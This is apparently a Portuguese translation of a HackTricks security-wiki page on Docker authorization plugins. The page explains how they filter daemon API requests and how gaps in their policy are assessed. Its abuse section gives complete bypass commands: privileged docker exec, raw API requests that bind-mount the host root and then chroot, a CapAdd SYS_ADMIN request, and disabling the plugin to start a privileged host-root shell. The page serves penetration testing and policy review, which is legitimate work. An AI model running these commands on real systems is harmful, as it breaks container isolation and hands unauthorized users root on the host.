# Plugins de Autorização em Tempo de Execução

{{#include ../../../banners/hacktricks-training.md}}

## Visão geral

Plugins de autorização em tempo de execução são uma camada extra de política que decide se um chamador pode executar uma determinada ação do daemon. Docker é o exemplo clássico. Por padrão, qualquer pessoa que consiga se comunicar com o Docker daemon efetivamente tem amplo controle sobre ele. Plugins de autorização tentam restringir esse modelo examinando o usuário autenticado e a operação de API solicitada, então permitindo ou negando a requisição de acordo com a política.

Este tópico merece sua própria página porque altera o modelo de exploração quando um atacante já tem acesso à API do Docker ou a um usuário no `docker` group. Em tais ambientes a questão não é mais apenas "consigo alcançar o daemon?" mas também "o daemon está protegido por uma camada de autorização e, em caso afirmativo, essa camada pode ser contornada por endpoints não tratados, parsing JSON fraco ou permissões de gerenciamento de plugins?"

## Operação

Quando uma requisição atinge o Docker daemon, o subsistema de autorização pode passar o contexto da requisição para um ou mais plugins instalados. O plugin vê a identidade do usuário autenticado, os detalhes da requisição, cabeçalhos selecionados e partes do corpo da requisição ou resposta quando o content type for adequado. Múltiplos plugins podem ser encadeados, e o acesso é concedido somente se todos os plugins permitirem a requisição.

Esse modelo parece forte, mas sua segurança depende inteiramente de quão completamente o autor da política entendeu a API. Um plugin que bloqueia `docker run --privileged` mas ignora `docker exec`, deixa passar chaves JSON alternativas como o top-level `Binds`, ou permite administração de plugins pode criar uma falsa sensação de restrição enquanto ainda deixa caminhos diretos de elevação de privilégio abertos.

## Alvos Comuns de Plugins

Áreas importantes para revisão da política são:

- endpoints de criação de container
- campos de `HostConfig` como `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode`, e opções de compartilhamento de namespaces
- comportamento de `docker exec`
- endpoints de gerenciamento de plugins
- qualquer endpoint que possa indiretamente disparar ações em runtime fora do modelo de política pretendido

Historicamente, exemplos como o `authz` plugin da Twistlock e plugins educacionais simples como `authobot` tornaram esse modelo fácil de estudar porque seus arquivos de política e caminhos de código mostravam como o mapeamento endpoint→ação era realmente implementado. Para trabalho de assessment, a lição importante é que o autor da política precisa entender a superfície total da API ao invés de apenas os comandos CLI mais visíveis.

## Abuso

O primeiro objetivo é aprender o que está realmente bloqueado. Se o daemon negar uma ação, o erro frequentemente leaks o nome do plugin, o que ajuda a identificar o controle em uso:
```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```
Se você precisar de um perfilamento de endpoints mais amplo, ferramentas como `docker_auth_profiler` são úteis porque automatizam a tarefa, de outro modo repetitiva, de verificar quais rotas de API e estruturas JSON são realmente permitidas pelo plugin.

Se o ambiente usa um plugin customizado e você pode interagir com a API, enumere quais campos dos objetos são realmente filtrados:
```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```
Essas verificações importam porque muitas falhas de autorização são específicas de campo em vez de específicas de conceito. Um plugin pode rejeitar um padrão de CLI sem bloquear completamente a estrutura equivalente da API.

### Exemplo completo: `docker exec` adiciona privilégios após a criação do container

Uma política que bloqueia a criação de containers privilegiados, mas permite a criação de containers não confinados além de `docker exec`, ainda pode ser contornada:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```
Se o daemon aceitar o segundo passo, o usuário recuperou um processo interativo privilegiado dentro de um container que o autor da política acreditava estar restrito.

### Exemplo Completo: Bind Mount Through Raw API

Algumas políticas defeituosas inspecionam apenas uma JSON shape. Se o root filesystem bind mount não for bloqueado de forma consistente, o host ainda pode ser montado:
```bash
docker version
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```
A mesma ideia também pode aparecer em `HostConfig`:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
http:/v1.41/containers/create
```
O impacto é um host filesystem escape completo. O detalhe interessante é que o bypass vem de cobertura incompleta da policy em vez de um kernel bug.

### Exemplo completo: Atributo Capability não verificado

Se a policy esquecer de filtrar um atributo relacionado a capability, o attacker pode criar um container que recupere uma capability perigosa:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```
Uma vez que `CAP_SYS_ADMIN` ou uma capability igualmente forte esteja presente, muitas técnicas de breakout descritas em [capabilities.md](protections/capabilities.md) e [privileged-containers.md](privileged-containers.md) tornam-se alcançáveis.

### Exemplo Completo: Desativando o Plugin

Se operações de gerenciamento de plugins forem permitidas, o bypass mais limpo pode ser desligar o controle completamente:
```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```
Isto é uma falha de política no nível do plano de controle. A camada de autorização existe, mas o usuário que ela deveria restringir ainda mantém permissão para desativá-la.

## Verificações

Esses comandos destinam-se a identificar se uma camada de política existe e se ela parece ser completa ou superficial.
```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```
O que é interessante aqui:

- Mensagens de negação que incluem o nome de um plugin confirmam uma camada de autorização e frequentemente revelam a implementação exata.
- Uma lista de plugins visível ao atacante pode ser suficiente para descobrir se operações de desativação ou reconfiguração são possíveis.
- Uma política que bloqueia apenas ações óbvias via CLI mas não solicitações API brutas deve ser tratada como passível de bypass até que se prove o contrário.

## Padrões de Runtime

| Runtime / plataforma | Estado padrão | Comportamento padrão | Enfraquecimentos manuais comuns |
| --- | --- | --- | --- |
| Docker Engine | Não ativado por padrão | O acesso ao daemon é efetivamente tudo-ou-nada, a menos que um plugin de autorização seja configurado | política de plugin incompleta, listas negras em vez de listas de permissão, permitir gerenciamento de plugins, pontos cegos em nível de campo |
| Podman | Não é um equivalente direto comum | O Podman geralmente depende mais de permissões Unix, execução rootless e decisões sobre exposição de API do que de plugins authz no estilo Docker | exposição ampla de uma API Podman com privilégios root, permissões fracas no socket |
| containerd / CRI-O | Modelo de controle diferente | Esses runtimes geralmente dependem de permissões de socket, limites de confiança do nó e controles do orquestrador em camadas superiores, em vez de plugins authz do Docker | montar o socket em workloads, suposições fracas de confiança local do nó |
| Kubernetes | Usa authn/authz nas camadas API-server e kubelet, não plugins authz do Docker | RBAC do cluster e controles de admission são a principal camada de política | RBAC excessivamente amplo, política de admission fraca, exposição direta do kubelet ou APIs de runtime |
{{#include ../../../banners/hacktricks-training.md}}
